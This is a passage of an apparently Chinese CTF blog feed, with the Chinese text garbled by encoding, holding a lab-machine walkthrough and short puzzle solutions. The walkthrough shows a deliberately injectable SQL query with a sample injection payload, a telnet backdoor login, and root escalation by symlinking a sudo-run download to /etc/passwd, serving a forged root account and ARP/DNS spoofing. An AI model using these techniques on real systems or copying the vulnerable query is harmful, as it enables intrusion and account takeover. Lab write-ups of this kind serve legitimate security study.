placeholder='Enter username' value='{{ keyword|default('') }}'&gt;\n            &lt;input type='submit' value='Search'&gt;\n        &lt;/form&gt;\n    {% endif %}\n    {% if results %}\n        &lt;h3&gt;Search Results&lt;/h3&gt;\n        &lt;table&gt;\n            &lt;tr&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;Username&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;\n            {% for row in results %}\n                &lt;tr&gt;&lt;td&gt;{{ row[0] }}&lt;/td&gt;&lt;td&gt;{{ row[1] }}&lt;/td&gt;&lt;td&gt;{{ row[2] }}&lt;/td&gt;&lt;/tr&gt;\n            {% endfor %}\n        &lt;/table&gt;\n    {% endif %}\n    {% if message %}\n        &lt;p class='error'&gt;{{ message }}&lt;/p&gt;\n    {% endif %}\n&lt;/body&gt;\n&lt;/html&gt;\n'''\n\n@app.route('/', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        username = request.form.get('username')\n        if username:\n            session['user'] = username\n            return redirect('/search')\n        return render_template_string(TEMPLATE, user=None, message='Username cannot be empty')\n    return render_template_string(TEMPLATE, user=None)\n\n@app.route('/logout')\ndef logout():\n    session.pop('user', None)\n    return redirect('/')\n\n@app.route('/search', methods=['GET', 'POST'])\ndef search():\n    if 'user' not in session:\n        return redirect('/')\n    \n    results = []\n    message = None\n    keyword = ''\n    \n    if request.method == 'POST':\n        keyword = request.form.get('keyword', '')\n        try:\n            cur = conn.cursor()\n            # Vulnerable SQL query: allows injection of commands like COPY TO PROGRAM\n            # Example exploit: ' OR 1=1; COPY users TO PROGRAM 'whoami'; --\n            sql = f'SELECT id, username, email FROM users WHERE username LIKE '%{keyword}%''\n            cur.execute(sql)\n            results = cur.fetchall()\n            conn.commit()\n        except Exception as e:\n            conn.rollback()\n            message = f'Query failed: {str(e)}'\n    \n    return render_template_string(TEMPLATE, user=session['user'], results=results, message=message, keyword=keyword)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=28080)\n'
[00:14:51] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'

[*] ending @ 00:14:51 /2025-07-22/
```

ÂêéÈù¢ÊâíÊãâ‰∫Ü‰∏Ä‰ºöÔºåÊÉäÂ•áÁöÑÂèëÁé∞ÂâçÈù¢ÁôΩÂπ≤‰∫ÜÔºåtelnetÊòØ‰∏™ÂêéÈó®

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ telnet 192.168.205.205
Trying 192.168.205.205...
Connected to 192.168.205.205.
Escape character is '^]'.
Username: 
xiao  
Password: 
login successful
Linux Multi 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
Your session is being monitored per security policy
xiao@Multi:~$ id
uid=1001(xiao) gid=1001(xiao) groups=1001(xiao)
```

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## to todd

```bash
xiao@Multi:~$ sudo -l
Sudo access restricted by policy (CODE:0x7E3) -l
xiao@Multi:~$ ls -al
total 24
drwx------ 2 xiao xiao 4096 Jul 18 22:46 .
drwxr-xr-x 5 root root 4096 Jul 17 09:04 ..
lrwxrwxrwx 1 root root    9 Jul 18 11:13 .bash_history -&gt; /dev/null
-rw-r--r-- 1 xiao xiao  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 xiao xiao 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 xiao xiao  807 Apr 18  2019 .profile
-rw------- 1 xiao xiao   44 Jul 17 07:31 user.txt
xiao@Multi:~$ cat user.txt 
flag{user-33b02bc15ce9557d2dd8484d58f95ac4}
xiao@Multi:~$ which sudo
/usr/bin/sudo
xiao@Multi:~$ /usr/bin/sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

[sudo] password for xiao: 
sudo: a password is required
```

sudoË¢´ÈôêÂà∂‰∫ÜÔºåÁúãÁúãÂÖ∂‰ªñÁöÑ
```bash
xiao@Multi:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/sbin/mount.nfs
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/telnetlogin
/usr/libexec/polkit-agent-helper-1
xiao@Multi:~$ getcap -r / 2&gt;/dev/null
xiao@Multi:~$ ls -al /opt/
total 12
drwxr-xr-x  2 root root 4096 Jul 18 11:21 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
-rw-r--r--  1 root root 3136 Jul 18 11:21 app.py
xiao@Multi:~$ find / -user xiao ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2&gt;/dev/null
/dev/pts/0
/home/xiao
/home/xiao/.bash_logout
/home/xiao/.bashrc
/home/xiao/user.txt
/home/xiao/.profile
/var/www/html/pub
```

`/var/www/html/pub`Ëøô‰∏™ÁõÆÂΩï‰πãÂâçÁàÜÁ†¥Âà∞‰∫ÜÔºå‰ΩÜÊòØ‰ªÄ‰πà‰∏úË•øÈÉΩÊ≤°ÊúâÔºåÊàë‰ª¨ÂéªÁúãÁúã

```bash
xiao@Multi:~$ cd /var/www/html/pub
xiao@Multi:/var/www/html/pub$ ls -al
total 16
drwxr-xr-x 2 xiao     www-data 4096 Jul 18 22:43 .
drwxr-xr-x 3 root     root     4096 Jul 17 09:05 ..
-rw-r--r-- 1 root     root      230 Jul 18 11:38 index.html
-rw------- 1 www-data www-data   19 Jul 17 09:06 xiao@Multi:~$ cd /var/www/html/pub
xiao@Multi:/var/www/html/pub$ ls -al
total 16
drwxr-xr-x 2 xiao     www-data 4096 Jul 18 22:43 .
drwxr-xr-x 3 root     root     4096 Jul 17 09:05 ..
-rw-r--r-- 1 root     root      230 Jul 18 11:38 index.html
-rw------- 1 www-data www-data   19 Jul 17 09:06 .passowrd_creds
```

Êúâ‰∏Ä‰∏™`.passowrd_creds`ÔºåÂéªwebËØª‰∏Ä‰∏ã

ÊãøÂà∞‰∫Ü‰∏Ä‰∏™ÂØÜÁ†Å`koUF5q)*RN&amp;m0PTB&amp;D`ÔºåÁªèËøáÊµãËØïÊòØtoddÁöÑÂØÜÁ†Å

```bash
xiao@Multi:/var/www/html/pub$ su todd
Use of su is prohibited (CODE:0x9F2) todd
xiao@Multi:/var/www/html/pub$ which su
/usr/bin/su
xiao@Multi:/var/www/html/pub$ /usr/bin/su todd
Password: 
todd@Multi:/var/www/html/pub$ id
uid=1000(todd) gid=1000(todd) groups=1000(todd)
```

## to root

```bash
todd@Multi:/var/www/html/pub$ sudo -l
Matching Defaults entries for todd on Multi:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+='LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET', env_keep+='XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH', mail_badpass

Runas and Command-specific defaults for todd:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User todd may run the following commands on Multi:
    (ALL : ALL) NOPASSWD: /usr/bin/cupp
```

ËøôÈáåÂ∫îËØ•Â∞±ÊòØËøô‰∏™Èù∂Êú∫ÊúâÊÑèÊÄùÁöÑÁÇπ‰∫ÜÔºåcuppÊòØ‰∏Ä‰∏™Â≠óÂÖ∏ÁîüÊàêÂô®

```bash
todd@Multi:/var/www/html/pub$ sudo /usr/bin/cupp -h
usage: cupp [-h] [-i | -w FILENAME | -l | -a | -v] [-q]

Common User Passwords Profiler

optional arguments:
  -h, --help         show this help message and exit
  -i, --interactive  Interactive questions for user password profiling
  -w FILENAME        Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce
  -l                 Download huge wordlists from repository
  -a                 Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified databases of Phenoelit and CIRT which were merged and enhanced
  -v, --version      Show the version of this program.
  -q, --quiet        Quiet mode (don't print banner)
```

ÁªèËøáÊµãËØïÔºå‰Ω†Â∫îËØ•‰ºöÂèëÁé∞`-i` ,`-w` ÁîüÊàêÁöÑÂ≠óÂÖ∏‰ºöÂõ∫ÂÆö`.txt`ÁöÑÂêéÁºÄÔºåÊâÄ‰ª•Êàë‰ª¨ÂæàÈöæÂà©Áî®

ÊØîËæÉÂèØËÉΩÊÄßÁöÑÊòØ`-l`

ÂÖ∑‰ΩìÊìç‰Ωú

```bash
todd@Multi:/var/www/html/pub$ cd 
todd@Multi:~$ sudo /usr/bin/cupp -l
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


        Choose the section you want to download:

     1   Moby            14      french          27      places
     2   afrikaans       15      german          28      polish
     3   american        16      hindi           29      random
     4   aussie          17      hungarian       30      religion
     5   chinese         18      italian         31      russian
     6   computer        19      japanese        32      science
     7   croatian        20      latin           33      spanish
     8   czech           21      literature      34      swahili
     9   danish          22      movieTV         35      swedish
    10   databases       23      music           36      turkish
    11   dictionaries    24      names           37      yiddish
    12   dutch           25      net             38      exit program
    13   finnish         26      norwegian       


        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        Tip: After downloading wordlist, you can improve it with -w option

&gt; Enter number: 1
[+] Downloading dictionaries/Moby/mhyph.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz ... 
^CTraceback (most recent call last):
  File '/usr/bin/cupp', line 1078, in &lt;module&gt;
    main()
  File '/usr/bin/cupp', line 1024, in main
    download_wordlist()
  File '/usr/bin/cupp', line 782, in download_wordlist
    download_wordlist_http(filedown)
  File '/usr/bin/cupp', line 993, in download_wordlist_http
    download_http(url, tgt)
  File '/usr/bin/cupp', line 698, in download_http
    localFile.write(webFile.read())
  File '/usr/lib/python3.9/http/client.py', line 471, in read
    s = self._safe_read(self.length)
  File '/usr/lib/python3.9/http/client.py', line 612, in _safe_read
    data = self.fp.read(amt)
  File '/usr/lib/python3.9/socket.py', line 704, in readinto
    return self._sock.recv_into(b)
KeyboardInterrupt
```

ÂèØ‰ª•ÁúãÂà∞ÊâßË°å sudo /usr/bin/cupp -l ÂêéÔºåËÑöÊú¨‰ºö‰ªé‰∏Ä‰∏™Âõ∫ÂÆöÁöÑ URL (http://ftp.funet.fi/...) ‰∏ãËΩΩÊñá‰ª∂„ÄÇ‰∏ãËΩΩÁöÑÊñá‰ª∂‰ºö‰øùÂ≠òÂú®**ÂΩìÂâçÂ∑•‰ΩúÁõÆÂΩï**‰∏ãÔºåÂπ∂ÂàõÂª∫‰∏Ä‰∏™ `dictionaries/` Â≠êÁõÆÂΩïÁªìÊûÑ„ÄÇ‰æãÂ¶ÇÔºåÈÄâÊã© 1 MobyÔºåÂÆÉ‰ºöÂ∞ùËØïÂàõÂª∫Âπ∂ÂÜôÂÖ•Êñá‰ª∂Âà∞ `./dictionaries/Moby/mhyph.tar.gz`„ÄÇÂõ†‰∏∫ÂëΩ‰ª§ÊòØ‰ª• sudo ÊâßË°åÁöÑÔºåÊâÄ‰ª•Êñá‰ª∂ÂÜôÂÖ•Êìç‰ΩúÊã•Êúâ root ÊùÉÈôê„ÄÇ

ËøôÈáåÂ∞±Êúâ‰∏Ä‰∏™ÈóÆÈ¢òÔºå‰ªñÊ≤°ÊúâÊ£ÄÊü•ÁõÆÊ†áË∑ØÂæÑÊòØÂê¶‰∏∫‰∏Ä‰∏™Á¨¶Âè∑ÈìæÊé•ÔºåÊâÄ‰ª•Êàë‰ª¨ÊÉ≥Ë¶ÜÁõñ‰ªÄ‰πàÂ∞±Ë¶ÜÁõñ‰ªÄ‰πà

```bash
todd@Multi:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
xiao:x:1001:1001::/home/xiao:/bin/bash
telnetd:x:106:113::/nonexistent:/usr/sbin/nologin
redis:x:107:114::/var/lib/redis:/usr/sbin/nologin
ftp:x:108:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
secure_user:x:1002:1002::/home/secure_user:/bin/bash
mysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false
samba_user:x:1003:1003::/home/samba_user:/bin/false
_rpc:x:110:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:111:65534::/var/lib/nfs:/usr/sbin/nologin
postgres:x:112:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
todd:x:1000:1000:,,,:/home/todd:/bin/bash

todd@Multi:~$ find dictionaries/
dictionaries/
dictionaries/Moby
dictionaries/Moby/mhyph.tar.gz
```

ÂÖàÂ∞ÜÁé∞Âú®ÁöÑdictionariesÈáçÂëΩÂêç‰∏∫1ÔºàÂú®Êàë‰ª¨ÁöÑÂÆ∂ÁõÆÂΩï‰∏ãÔºåÊàë‰ª¨ÊúâÁªùÂØπÁöÑÊùÉÈôêÔºâÔºåÂπ∂‰º™ÈÄ†‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑdictionaries

```bash
todd@Multi:~$ mv dictionaries/ 1
todd@Multi:~$ mkdir -p dictionaries/Moby
todd@Multi:~$ cd dictionaries/Moby/
todd@Multi:~/dictionaries/Moby$ ln -s /etc/passwd mhyph.tar.gz
```

ÂàáÊç¢Âà∞kailÔºåÊåâÁÖß‰ªñÁöÑpasswdÂú®ÊúÄÂêé‰∏ÄË°åÁªôËá™Â∑±Âä†‰∏Ä‰∏™ÁâπÊùÉÁî®Êà∑ÔºåÁÑ∂ÂêéÈáçÂëΩÂêçÔºåÂºÄ‰∏Ä‰∏™webÊúçÂä°

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cd tmp 
                          
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ mkdir -p ./pub/unix/security/passwd/crack/dictionaries/Moby/
                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ mkdir -p ./pub/unix/security/passwd/crack/dictionaries/Moby/
                               
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ vim ./pub/unix/security/passwd/crack/dictionaries/Moby/pass        
                       
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ tail -n 1 ./pub/unix/security/passwd/crack/dictionaries/Moby/pass
b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ mv ./pub/unix/security/passwd/crack/dictionaries/Moby/pass ./pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

ÂêØÂä® DNS Ê¨∫È™ó

```bash
sudo bettercap
&gt;&gt; set arp.spoof.targets 192.168.205.205
&gt;&gt; set dns.spoof.domains ftp.funet.fi
&gt;&gt; set dns.spoof.address 192.168.205.128
&gt;&gt; arp.spoof on
&gt;&gt; dns.spoof on
```

Ëß¶ÂèëÊºèÊ¥û

```bash
todd@Multi:~/dictionaries/Moby$ cd 
todd@Multi:~$ sudo /usr/bin/cupp -l
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


        Choose the section you want to download:

     1   Moby            14      french          27      places
     2   afrikaans       15      german          28      polish
     3   american        16      hindi           29      random
     4   aussie          17      hungarian       30      religion
     5   chinese         18      italian         31      russian
     6   computer        19      japanese        32      science
     7   croatian        20      latin           33      spanish
     8   czech           21      literature      34      swahili
     9   danish          22      movieTV         35      swedish
    10   databases       23      music           36      turkish
    11   dictionaries    24      names           37      yiddish
    12   dutch           25      net             38      exit program
    13   finnish         26      norwegian       


        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        Tip: After downloading wordlist, you can improve it with -w option

&gt; Enter number: 1
[+] Downloading dictionaries/Moby/mhyph.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz ... 
[+] Downloading dictionaries/Moby/mlang.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mlang.tar.gz ... 
Traceback (most recent call last):
  File '/usr/bin/cupp', line 1078, in &lt;module&gt;
    main()
  File '/usr/bin/cupp', line 1024, in main
    download_wordlist()
  File '/usr/bin/cupp', line 782, in download_wordlist
    download_wordlist_http(filedown)
  File '/usr/bin/cupp', line 993, in download_wordlist_http
    download_http(url, tgt)
  File '/usr/bin/cupp', line 696, in download_http
    webFile = urllib.request.urlopen(url)
  File '/usr/lib/python3.9/urllib/request.py', line 214, in urlopen
    return opener.open(url, data, timeout)
  File '/usr/lib/python3.9/urllib/request.py', line 523, in open
    response = meth(req, response)
  File '/usr/lib/python3.9/urllib/request.py', line 632, in http_response
    response = self.parent.error(
  File '/usr/lib/python3.9/urllib/request.py', line 561, in error
    return self._call_chain(*args)
  File '/usr/lib/python3.9/urllib/request.py', line 494, in _call_chain
    result = func(*args)
  File '/usr/lib/python3.9/urllib/request.py', line 641, in http_error_default
    raise HTTPError(req.full_url, code, msg, hdrs, fp)
urllib.error.HTTPError: HTTP Error 404: File not found
```

Êä•Èîô‰∫ÜÔºåÂπ∂‰∏îbettercapÂíåpyton webÈÉΩÊúâÊèêÁ§∫Â∞±ÊòØÊàêÂäü‰∫Ü

```bash
todd@Multi:~$ su b
Password: 
root@Multi:/home/todd# id
uid=0(root) gid=0(root) groups=0(root)
root@Multi:/home/todd# cat /root/root.txt /home/xiao/user.txt 
flag{root-922c8837565de5bd2e342c65a2e67ef9}
flag{user-33b02bc15ce9557d2dd8484d58f95ac4}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Mutli.html</guid><pubDate>Wed, 06 Aug 2025 00:46:39 +0000</pubDate></item><item><title>Challenge 089</title><link>https://7r1UMPHK.github.io/post/Challenge%20089.html</link><description>![image-20250803111300907](http://7r1UMPHK.github.io/image/20250803111301164.webp)

```
N2QgNmUgNzUgNjYgNWYgNzMgMzEgNWYgNjcgNmUgMzEgNzIgMzMgNjggNzAgMzEgNjMgMzMgNDQgN2IgNDcgNDEgNGMgNDY
```

![image-20250803111333055](http://7r1UMPHK.github.io/image/20250803111333344.webp)

```
}nuf_s1_gn1r3hp1c3D{GALF
```

ÂèçÂêë‰π¶ÂÜô

https://www.dcode.fr/reverse-writing

```
FLAG{D3c1ph3r1ng_1s_fun}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20089.html</guid><pubDate>Wed, 06 Aug 2025 00:41:04 +0000</pubDate></item><item><title>Challenge 088</title><link>https://7r1UMPHK.github.io/post/Challenge%20088.html</link><description>![image-20250803110319152](http://7r1UMPHK.github.io/image/20250803110319359.webp)

Èü≥È¢ëÈ¢òÔºåËøòÊòØta0Âá∫ÁöÑÔºåÈÇ£ÂéªÂê¨Âê¨ÊÄé‰πàËØªÁöÑ

ÊàëÂê¨‰∫ÜÂçäÂ§©ÔºåÁªìÊûúaiÂê¨Âá∫Êù•‰∫ÜÔºå666

```
HMV{IlikeChinese}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20088.html</guid><pubDate>Wed, 06 Aug 2025 00:40:47 +0000</pubDate></item><item><title>Challenge 087</title><link>https://7r1UMPHK.github.io/post/Challenge%20087.html</link><description>![image-20250803103549525](http://7r1UMPHK.github.io/image/20250803103549762.webp)

```bash
Problem: SC5cLlspLlwpLlspLlwuWy5c7I6XLkgpLi4uLg== Hint: key is kerszi and what can you see ? Flag format: flag{xxx}
```

base64Ëß£‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ echo 'SC5cLlspLlwpLlspLlwuWy5c7I6XLkgpLi4uLg=='|base64 -d
H.\.[).\).[).\.[.\Ïéó.H)....
```

key:kerszi

xor

![image-20250803104615642](http://7r1UMPHK.github.io/image/20250803104615923.webp)

```
F R U' R' U' R U R' F'    
```

È≠îÊ≥ïÊñπÁ®ã

https://rubikscu.be/

![image-20250803110156219](http://7r1UMPHK.github.io/image/20250803110156383.webp)

```bash
flag{T}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20087.html</guid><pubDate>Wed, 06 Aug 2025 00:40:29 +0000</pubDate></item><item><title>Challenge 086</title><link>https://7r1UMPHK.github.io/post/Challenge%20086.html</link><description>![image-20250803102805187](http://7r1UMPHK.github.io/image/20250803102805423.webp)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 086.zip -o086

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 98681 bytes (97 KiB)

Extracting archive: 086.zip
--
Path = 086.zip
Type = zip
Physical Size = 98681

Everything is Ok

Size:       100517
Compressed: 98681
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cd 086   
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/086]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 103
drwxr-xr-x 1 kali kali      0 2025Âπ¥ 8Êúà 2Êó• .
drwxr-xr-x 1 kali kali   4096 2025Âπ¥ 8Êúà 2Êó• ..
-rwxr-xr-x 1 kali kali 100517 2024Âπ¥ 9Êúà29Êó• EZPZ.png
```

![image-20250803102855174](http://7r1UMPHK.github.io/image/20250803102855280.webp)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/086]
‚îî‚îÄ$ exiftool EZPZ.png 
ExifTool Version Number         : 13.25
File Name                       : EZPZ.png
Directory                       : .
File Size                       : 101 kB
File Modification Date/Time     : 2024:09:29 08:13:27-04:00
File Access Date/Time           : 2025:08:02 22:28:55-04:00
File Inode Change Date/Time     : 2024:09:29 08:13:27-04:00
File Permissions                : -rwxr-xr-x
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 500
Image Height                    : 461
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Profile Name                    : ICC Profile
Profile CMM Type                : Little CMS
Profile Version                 : 4.4.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2024:09:14 17:27:52
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : GIMP built-in sRGB
Profile Copyright               : Public Domain
Media White Point               : 0.9642 1 0.82491
Chromatic Adaptation            : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168
Red Matrix Column               : 0.43604 0.22249 0.01392
Blue Matrix Column              : 0.14305 0.06061 0.71393
Green Matrix Column             : 0.38512 0.7169 0.09706
Red Tone Reproduction Curve     : (Binary data 32 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 32 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 32 bytes, use -b option to extract)
Chromaticity Channels           : 3
Chromaticity Colorant           : Unknown
Chromaticity Channel 1          : 0.64 0.33002
Chromaticity Channel 2          : 0.3 0.60001
Chromaticity Channel 3          : 0.15001 0.06
Device Mfg Desc                 : GIMP
Device Model Desc               : sRGB
Comment                         : MDEwMDAwMDEgMDEwMDAwMTAgMDEwMDAxMTEgMDEwMTExMTEgMDEwMDExMTAgMDEwMTExMTEgMDEwMTAwMTEgMDEwMTEwMDEgMDEwMDExMTAgMDEwMTAxMDAgMDExMTEwMTEgMDEwMTEwMDEgMDEwMDAxMTAgMDEwMDExMTEgMDExMTExMDE=
Image Size                      : 500x461
Megapixels                      : 0.231
```

![image-20250803103024253](http://7r1UMPHK.github.io/image/20250803103024563.webp)

base64 binary

```
ABG_N_SYNT{YFO}
```

ÊòØrot13Ôºå‰ΩÜÊòØË¢´ËÄç‰∫Ü

![image-20250803103450684](http://7r1UMPHK.github.io/image/20250803103450943.webp)

ÈÇ£Áúãlsb

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/086]
‚îî‚îÄ$ zsteg EZPZ.png
meta Comment        .. text: 'MDEwMDAwMDEgMDEwMDAwMTAgMDEwMDAxMTEgMDEwMTExMTEgMDEwMDExMTAgMDEwMTExMTEgMDEwMTAwMTEgMDEwMTEwMDEgMDEwMDExMTAgMDEwMTAxMDAgMDExMTEwMTEgMDEwMTEwMDEgMDEwMDAxMTAgMDEwMDExMTEgMDExMTExMDE='
imagedata           .. file: amd 29k coff noprebar executable
b1,r,lsb,xy         .. text: 'HMV{I7_w45_3a5y_R1GH7}'
b1,rgb,msb,xy       .. file: OpenPGP Public Key
b2,g,lsb,xy         .. file: VISX image file
b3,bgr,lsb,xy       .. file: OpenPGP Secret Key
b4,g,lsb,xy         .. text: 'UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUDDUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU'
b4,b,lsb,xy         .. text: 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD33DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'
b4,b,msb,xy         .. text: ['\'' repeated 186 times]
```

flag

```
HMV{I7_w45_3a5y_R1GH7}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20086.html</guid><pubDate>Wed, 06 Aug 2025 00:40:09 +0000</pubDate></item><item><title>Challenge 085</title><link>https://7r1UMPHK.github.io/post/Challenge%20085.html</link><description>![image-20250803102242549](http://7r1UMPHK.github.io/image/20250803102242764.webp)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 085.zip -o085

